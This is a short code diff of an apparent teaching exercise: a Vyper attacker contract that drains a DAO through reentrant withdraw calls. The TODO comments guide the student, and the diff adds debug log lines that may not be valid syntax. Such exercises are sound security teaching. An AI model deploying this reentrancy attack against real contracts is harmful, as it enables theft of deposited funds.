@@ -21,7 +21,7 @@ def _attack() -> bool:
     
     # TODO: Use the DAO interface to withdraw funds.
     # Make sure you add a "base case" to end the recursion
-    if self.dao_contract.balance > 0:
+    if self.dao_address.balance > 0:
         self.dao_contract.withdraw()
     return True
 
@@ -34,6 +34,9 @@ def attack(dao_address:address):
     # Attack cannot withdraw more than what exists in the DAO
     if dao_address.balance < msg.value:
         deposit_amount = dao_address.balance
+
+    log deposit_amount
+    log "hello"
   
     # TODO: make the deposit into the DAO  
     self.dao_contract.deposit(value=deposit_amount) 
